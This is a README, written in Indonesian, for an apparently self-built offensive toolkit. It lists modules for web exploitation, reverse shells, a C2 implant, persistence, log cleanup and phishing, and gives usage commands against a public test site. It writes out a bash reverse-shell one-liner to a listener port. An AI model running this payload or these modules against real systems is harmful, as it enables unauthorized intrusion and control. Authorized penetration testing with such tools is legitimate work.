# Arsenal Apik

Arsenal Apik adalah kumpulan tools keamanan custom yang dirancang untuk bug bounty hunter, red team, dan penetration tester.  
Semua module ditulis dari 0 — bukan wrapper, bukan fork.

---

## Fitur

- 39 module siap pakai
- Support SQL injection, XSS, SSRF, SSTI, reverse shell, upload shell, dan banyak lagi
- Auto-exploit: scan + exploit otomatis dalam 1 perintah
- Dashboard web untuk monitoring hasil scan
- C2 listener untuk reverse shell
- Output JSON, Markdown, atau teks biasa
- Ringan, bisa dijalankan di Termux (Android) maupun VPS

---

## Instalasi

```bash
git clone https://github.com/seala4ngel/angelmind.git
cd angelmind
pip install -r requirements.txt

Cara Pakai

Format perintah:

```bash
python run.py --module [nama_module] --target [target] [opsi_tambahan]
```

Contoh penggunaan

```bash
# SQL injection
python run.py --module sqli --target http://testphp.vulnweb.com --param id

# Reverse shell generator (P1)
python run.py --module revshell --target example.com --ip 0.0.0.0 --port 4444 --platform linux

# Auto-exploit (scan + exploit otomatis)
python run.py --module auto_exploit --target http://testphp.vulnweb.com
```

Cek daftar semua module dan opsi:

```bash
python run.py --help
```

---

Output

Hasil scan bisa ditampilkan dalam 3 format:

```bash
# JSON (default)
python run.py --module sqli --target http://testphp.vulnweb.com --param id

# Markdown (buat laporan)
python run.py --module sqli --target http://testphp.vulnweb.com --param id --output markdown

# Teks biasa
python run.py --module sqli --target http://testphp.vulnweb.com --param id --output text
```

---

Dashboard Web

Untuk melihat hasil scan di browser:

```bash
python dashboard_app.py
```

Lalu buka http://localhost:5001 di browser.

---

C2 Listener (Reverse Shell)

1. Jalankan listener di terminal 1:

```bash
python listener.py 9999
```

2. Di terminal 2, kirim payload ke target (contoh):

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
```

3. Kalo berhasil, di terminal 1 kamu bakal dapet shell.

---

Daftar Module

Kategori Module Priority
Exploit sqli, xss, ssrf, ssti, graphql, deser, authbypass, chain, vulntrigger P2-P3
Exploit (P1) revshell, sqli_shell, ssrf_shell, uploader P1
Scanner misconfig, leakscan, bucketscan P4
Fuzz webfuzz, apifuzz, intel_fuzz P4
C2 implant, beacon P1
Post privesc, lateral, cleanup, persist P1
Attack phishing, exploit_payload, weaponize, diff, crash, mailcraft, pretext, attack, auto_exploit P1
Recon subhunter, portprobe, fingerprint P5

Priority: P1 = Critical, P5 = Informasi

---

Catatan Penting

· Tools ini hanya untuk red team, bug bounty, dan penetration testing yang sah.
· Gunakan hanya pada target yang memiliki izin.
· Penulis tidak bertanggung jawab atas penyalahgunaan.

---

Kontribusi

Kalo mau nambah module atau lapor bug, buka issue atau pull request di GitHub.

---

Lisensi

MIT

---

Dibuat oleh

seala4ngel

```

---
